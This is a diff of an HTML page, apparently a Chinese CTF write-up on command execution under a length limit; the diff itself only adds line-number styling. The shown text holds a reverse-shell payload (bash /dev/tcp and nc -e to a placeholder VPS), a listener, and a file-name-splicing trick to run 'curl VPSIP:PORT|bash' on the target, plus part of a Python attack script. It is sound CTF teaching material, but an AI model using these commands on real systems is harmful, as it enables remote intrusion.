@@ -584,12 +584,12 @@
 
 <h2 id="参考-Payload"><a href="#参考-Payload" class="headerlink" title="参考 Payload"></a>参考 Payload</h2><p>这个是<strong>反弹 shell</strong> 的思路。</p>
 <p>最开始需要在 VPS 某个页面上放个反弹 shell 的脚本。</p>
-<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">&gt;&amp;</span> /dev/tcp/VPSIP/PORT <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
-<span class="token comment"># 或者 nc -e /bin/sh VPSIP PORT</span></code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">&gt;&amp;</span> /dev/tcp/VPSIP/PORT <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
+<span class="token comment"># 或者 nc -e /bin/sh VPSIP PORT</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>然后起个服务监听这个端口。</p>
-<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> -lvvp PORT</code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> -lvvp PORT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>要被打的机器上，先生成 <code>ls -th &gt; g</code>，而后文件名拼接实现 <code>curl VPSIP:PORT|bash</code>，然后执行 <code>sh x</code> 生成反弹的命令，最后 <code>sh g</code> 触发命令执行，在 VPS 上拿到 shell。</p>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># coding: utf-8</span>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding: utf-8</span>
 <span class="token keyword">import</span> requests
 <span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote
 
@@ -648,7 +648,7 @@ r<span class="token punctuation">.</span>encoding <span class="token operator">=
 r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>baseurl<span class="token operator">+</span>quote<span class="token punctuation">(</span><span class="token string">"sh g"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'==&gt;'</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
-s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>reset<span class="token punctuation">)</span></code></pre>
+s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>reset<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <br>
 
 <h2 id="参考题目"><a href="#参考题目" class="headerlink" title="参考题目"></a>参考题目</h2><p><strong>0x41414141 CTF 2021 hackme:</strong></p>
